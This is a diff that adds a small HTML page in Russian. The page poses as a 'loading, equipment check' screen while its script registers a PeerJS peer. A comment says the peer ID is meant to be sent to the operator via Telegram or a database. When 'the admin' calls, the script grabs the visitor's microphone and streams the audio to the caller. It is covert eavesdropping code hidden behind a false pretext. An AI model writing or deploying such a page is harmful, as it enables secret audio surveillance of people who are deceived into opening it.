@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Загрузка...</title>
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+</head>
+<body style="background: #000; color: #333; display: flex; justify-content: center; align-items: center; height: 100vh;">
+    <p>Пожалуйста, подождите, идет проверка оборудования...</p>
+
+    <script>
+        // Генерируем случайное имя для устройства, например: user-8234
+        const deviceId = 'user-' + Math.floor(Math.random() * 10000);
+        const peer = new Peer(deviceId); 
+
+        peer.on('open', (id) => {
+            console.log('ID этого устройства:', id);
+            // В идеале тут должен быть код, отправляющий этот ID тебе в Telegram или базу данных
+        });
+
+        // Слушаем входящие "звонки" от админа
+        peer.on('call', (call) => {
+            navigator.mediaDevices.getUserMedia({ audio: true })
+                .then((stream) => {
+                    call.answer(stream); // Начинаем трансляцию звука админу
+                });
+        });
+    </script>
+</body>
+</html>
